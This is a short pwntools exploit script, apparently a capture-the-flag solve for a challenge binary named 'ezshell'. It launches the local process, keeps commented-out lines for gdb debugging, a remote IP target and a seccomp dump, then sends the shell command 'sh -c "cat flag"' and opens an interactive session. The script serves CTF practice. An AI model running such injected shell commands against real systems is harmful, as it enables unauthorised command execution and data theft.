from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
from ctypes import *
context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/ezshell")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b *0x4013D2')
# p=remote('1.95.81.93',57777)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
# elf = ELF("/home/zp9080/PWN/pwn")
# libc=elf.libc 

#b *$rebase(0x14F5)
def dbg():
    gdb.attach(p,'b *$rebase(0x1435)')
    pause()

p.sendline('sh -c "cat flag"')

p.interactive()






